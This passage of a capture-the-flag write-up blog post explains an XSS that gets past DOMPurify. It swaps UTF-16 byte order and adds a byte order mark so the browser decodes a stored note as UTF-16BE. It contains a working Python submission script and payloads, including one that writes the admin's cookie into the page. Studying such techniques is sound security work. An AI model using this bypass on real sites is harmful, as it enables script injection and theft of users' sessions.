+<p>In internationalization, CJK characters is a collective term for graphemes used in the Chinese, Japanese, and Korean writing systems
+<em>- Wikipedia</em></p>
+</blockquote>
+<p>Let&rsquo;s try and make use of our new information:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src onerror=alert(1)&gt;&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sent: 㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- server ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># received: 㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sanitized: 㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># saved: &lt;Buffer 00 3c 00 69 00 6d 00 67 00 20 00 73 00 72 00 63 00 20 00 6f 00 6e 00 65 00 72 00 72 00 6f 00 72 00 3d 00 61 00 6c 00 65 00 72 00 74 00 28 00 31 00 29 ... 2 more bytes&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- client ---</span>
+</span></span><span style="display:flex;"><span>data: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>decoded_utf_16_le: 㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀<span style="color:#960050;background-color:#1e0010">⠀㄀⤀</span>㸀
+</span></span></code></pre></div><p>In our updated payload, we encode our payload using <code>utf-16-be</code> then decode it back into Python&rsquo;s internal UTF-8 representation using <code>utf-16-le</code>. This has the effect of swapping the bytes of our payload and using UTF-8 (Python&rsquo;s internal string representation) as our method storing the swapped bytes.</p>
+<p>Printing out the swapped UTF-8 bytes in Python we get &lsquo;&lsquo;㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀&quot; notice the first character, looks familiar?</p>
+<p>When this string goes through DOMPurify, it will mostly be a passthrough as it is just a pure CJK string with no HTML meta characters, it is then saved in little endian and decoded by the browser also as little endian, the user ends up seeing the same CJK string:</p>
+<p><img src="/posts/bom-sniffing-to-xss/html-chinese.png"></p>
+<p>We need to do better. Hmm&hellip;</p>
+<p>Let&rsquo;s stop and recap what we have done. So far, we are able to disguise our payload by swapping each byte pair using our little <code>.encode('utf-16-le').decode('utf-16-be')</code> trick. This method allowed our payload to go through DOMPurify since it really is just an innocent string at that point.</p>
+<p>However, can we get this innocuous string to do something malicious on the client side?</p>
+<p>Looking closely, what we managed to pass through is not just any random string. It is unique as it actually holds double meaning based on the way you choose to interpret it, one way being less innocent than the other.</p>
+<p>What does that mean?</p>
+<p>As we know, the server responds with <code>Content-Type: application/html; charset=utf-8</code> which instructs the browser to treat the response as little endian, this in turn causes our manipulated, swapped bytes like <code>\x00\x3c</code> to be decoded to correctly to 㰀 instead of being rendered as the malicious form that we intend.</p>
+<p>We can illustrate this better in CyberChef:
+<img src="/posts/bom-sniffing-to-xss/cyberchef-le.png"></p>
+<ul>
+<li>Blue is us swapping the payload bytes into a harmless string</li>
+<li>Red is the server as it encodes and saves the DOMPurify output to disk</li>
+<li>Orange is what the browser sees - also a harmless string in the case of UTF-16LE</li>
+</ul>
+<p>Let&rsquo;s see what happens if we change the orange part to interpret the string as UTF-16BE:
+<img src="/posts/bom-sniffing-to-xss/cyberchef-be.png"></p>
+<p>The illustration above means that if we could, somehow, instruct the browser to ignore that <code>charset=utf-16le</code> in the response and use <code>utf-16be</code> instead, we will be able to achieve XSS.</p>
+<h2 id="bom-bom-bom">BOM&hellip; BOM&hellip; BOM&hellip;<a href="#bom-bom-bom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Our findings above, lead us to one question: how does our browser determine content encoding or endianness of its content to start with?</p>
+<p>I chose to ask the most authoritative source on the matter, the WHATWG HTML specification itself.</p>
+<p>Within the <a href="https://html.spec.whatwg.org/multipage/parsing.html#determining-the-character-encoding">WHATWG HTML Standard</a> we can search for &ldquo;encoding&rdquo; or &ldquo;charset&rdquo; and eventually we can find a section that reads &ldquo;Determining the character encoding&rdquo; :
+<img src="/posts/bom-sniffing-to-xss/whatwg-bom.png"></p>
+<p>The section lists 9 different <em>algorithms</em> for determining a document&rsquo;s character encoding, ordered by precedence, primarily:</p>
+<blockquote>
+<ol>
+<li>If the result of BOM sniffing is an encoding, return that encoding with confidence certain.</li>
+</ol>
+</blockquote>
+<p>So there is a procedure called &ldquo;BOM sniffing&rdquo; that takes precedence over everything else for determining the character encoding of a document.</p>
+<p>Let&rsquo;s see what the section on BOM sniffing has to say:
+<img src="/posts/bom-sniffing-to-xss/bom-sniffing.png">
+<a href="https://encoding.spec.whatwg.org/#bom-sniff">Reference</a></p>
+<p>Byte order mark (BOM) sniffing is a technique that allows a parser to determine the character encoding and endianness of the content by inspecting the first two to three bytes for a certain sequence.</p>
+<p>The sequence used as a BOM is the <em>U+FEFF ZERO WIDTH NO-BREAK SPACE</em> <a href="https://util.unicode.org/UnicodeJsps/character.jsp?a=FEFF&B1=Show">codepoint</a> which is an invisible zero-width Unicode codepoint. This codepoint&rsquo;s encoded represntation is used as a telltale regarding the encoding of the rest of the content.</p>
+<table>
+<thead>
+<tr>
+<th>Byte order mark</th>
+<th>Encoding</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xEF 0xBB 0xBF</td>
+<td>UTF-8</td>
+</tr>
+<tr>
+<td>0xFE 0xFF</td>
+<td>UTF-16BE</td>
+</tr>
+<tr>
+<td>0xFF 0xFE</td>
+<td>UTF-16LE</td>
+</tr>
+</tbody>
+</table>
+<p>Notice that if we are to use Python to send this sequence, we should use the <code>\ufeff</code> escape literal or the <code>b'\xef\xbb\xbf\</code> byte sequence since Python uses UTF-8 strings. In Python, <code>\ufeff</code> is not equivalent to <code>\xfe\xff</code> as the former would be UTF-16BE decoded to <code>fe ff</code> as a single codepoint, while the latter would be UTF-16BE decoded to <code>00 fe 00 ff</code> as two codepoints.</p>
+<p>The example below illustrates that the two are indeed different using three encodings:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># utf-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xef\xbb\xbf</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc3\xbe\xc3\xbf</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># utf-16-be</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\xfe\x00\xff</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># utf-16-le</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff\xfe</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\x00\xff\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p>Play around with encoding and decoding, try different combinations until you get the hang of it, it is useful to wrap your head around this important concept and be able to write code that deals with encodings comfortably.</p>
+<p>As a side note, you can use <a href="https://util.unicode.org/UnicodeJsps/character.jsp?a=FEFF&B1=Show">util.unicode.org</a> to explore  different codepoints and their representations.</p>
+<h2 id="assembling-the-pieces">Assembling the Pieces<a href="#assembling-the-pieces" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Based on everything we have discussed so far, we know that to coerce the browser into using <code>UTF-16BE</code> encoding, we need to provide the <em>Byte order mark</em> <code>0xfe 0xff</code> before our payload. we also know how to send the BOM correctly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># --- attacker side ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># what payload looks like after swapping</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&lt;img src onerror=alert(1)&gt;&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufffe</span><span style="color:#e6db74">㰀椀洀最</span><span style="color:#ae81ff">\u2000</span><span style="color:#e6db74">猀爀挀</span><span style="color:#ae81ff">\u2000</span><span style="color:#e6db74">漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀</span><span style="color:#ae81ff">\u3100</span><span style="color:#e6db74">⤀㸀&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- server-side ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># server encodes and saves to disk</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufffe</span><span style="color:#e6db74">㰀椀洀最</span><span style="color:#ae81ff">\u2000</span><span style="color:#e6db74">猀爀挀</span><span style="color:#ae81ff">\u2000</span><span style="color:#e6db74">漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀</span><span style="color:#ae81ff">\u3100</span><span style="color:#e6db74">⤀㸀&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff\x00</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- victim / client-side ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># browser tries to identify content encoding, it starts with</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># BOM sniffing and encounters the sequence \xfe\xff which denotes UTF-16BE</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff\x00</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&gt;&#39;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&lt;img src onerror=alert(1)&gt;&#39;</span>
+</span></span></code></pre></div><p>Looks good on paper, let&rsquo;s wrap it all in a nice script and run it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&lt;img src onerror=alert(1)&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/submit?</span><span style="color:#e6db74">{</span>quote(payload)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>note_id <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Location&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/notes/&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># we keep the note so we can check the content in a browser</span>
+</span></span><span style="display:flex;"><span>print(note_id)
+</span></span></code></pre></div><p>Internally:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&lt;img src onerror=alert(1)&gt;&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sent: 㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- server ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># received: ￾㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sanitized: ￾㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀⠀㄀⤀㸀</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># saved: &lt;Buffer fe ff 00 3c 00 69 00 6d 00 67 00 20 00 73 00 72 00 63 00 20 00 6f 00 6e 00 65 00 72 00 72 00 6f 00 72 00 3d 00 61 00 6c 00 65 00 72 00 74 00 28 00 31 ... 4 more bytes</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- client ---</span>
+</span></span><span style="display:flex;"><span>data: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\xff\x00</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>decoded_utf_16_le: <span style="color:#960050;background-color:#1e0010">￾</span>㰀椀洀最 猀爀挀 漀渀攀爀爀漀爀㴀愀氀攀爀琀<span style="color:#960050;background-color:#1e0010">⠀㄀⤀</span>㸀
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># browser chooses this because of the BOM</span>
+</span></span><span style="display:flex;"><span>decoded_utf_16_be: <span style="color:#f92672">&lt;</span>img src onerror<span style="color:#f92672">=</span>alert(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Which also means:
+<img src="/posts/bom-sniffing-to-xss/bom-xss.png"></p>
+<p>We can now craft a weaponized payload to send the admin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\ufeff</span><span style="color:#e6db74">&lt;script&gt;document.write(document.cookie)&lt;/script&gt;&#39;</span>
+</span></span></code></pre></div><p>Running this on the challenge instance, and sending the saved <code>note_id</code> to the admin bot gives us:
+<img src="posts/BOM%20Sniffing%20to%20XSS/flag.png"></p>
+<p><code>GPNCTF{UN1C0D3_15_4_N34T_4TT4CK_V3CT0R}</code></p>
+<p>A neat vector indeed.</p>
+<p>Well, that was fun and educational. Generally, I find encoding and Unicode fascinating and would like to learn more about them, I don&rsquo;t know why actually, I used to think of encoding as a dull topic, but as I explored it more, the challenge it tries to solve, how different encodings are more suitable for certain applications, parsing logic, etc, I realized it actually is very interesting.</p>
+<p>Also now that I know that encoding can be abused to perform various web attacks like WAF bypasses and even the XSS we have done here, I am more interested than ever :)</p>
+<p>References:</p>
+<ul>
+<li><a href="https://docs.python.org/3/howto/unicode.html">https://docs.python.org/3/howto/unicode.html</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Unicode">https://en.wikipedia.org/wiki/Unicode</a></li>
+<li><a href="https://en.wikipedia.org/wiki/UTF-8">https://en.wikipedia.org/wiki/UTF-8</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Unicode_Consortium">https://en.wikipedia.org/wiki/Unicode_Consortium</a></li>
+</ul>
+<p>Anyways, hope you enjoyed - I did - and learnt something new - I also did - and see you in the next one! 👋</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="//localhost:1313/posts/bad-challenge-arab-security-war-games-2024/">
+                <span class="button__icon">←</span>
+                <span class="button__text">&#34;Bad&#34; - Arab Security War Games 2024</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/">
+                <span class="button__text">Apexsurvive Writeup (HTB Cyber Apocalypse 2024)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="//localhost:1313/assets/main.js"></script>
+<script src="//localhost:1313/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
